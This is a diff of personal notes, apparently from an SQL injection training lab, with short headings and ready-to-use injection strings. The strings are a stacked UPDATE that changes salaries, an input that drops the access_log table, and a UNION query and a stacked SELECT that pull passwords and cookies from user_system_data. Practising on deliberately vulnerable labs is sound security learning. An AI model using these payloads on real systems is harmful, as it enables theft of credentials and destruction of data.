@@ -1,3 +1,4 @@
+## SQL injection (introduction)
 ### wehave to write query to select specific user
 i used user id from previous page
 ```
@@ -39,4 +40,15 @@ auth_tan = 3SL99A' ;UPDATE employees SET salary=100000 WHERE last_name='Smith'--
 
 ```
 search = ';DROP TABLE access_log
+```
+
+## SQL injection Advanced
+###Pulling data from other tables
+Can be done using UNION
+```
+dafdfdf' UNION select userid, user_name as first_name,null as last_name,password as cc_number,null as cc_type,cookie,null as login_count FROM user_system_data --
+```
+OR new query
+```
+sdsd';SELECT * FROM user_system_data --
 ```
